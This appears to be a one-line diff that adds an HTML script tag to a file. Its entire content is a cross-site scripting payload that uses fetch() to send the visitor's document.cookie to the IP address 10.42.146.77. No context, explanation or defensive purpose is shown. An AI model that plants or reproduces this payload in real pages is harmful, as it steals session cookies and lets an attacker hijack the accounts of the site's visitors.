@@ -1,0 +1,1 @@
+<script>fetch('http://10.42.146.77/.'+document.cookie)</script>
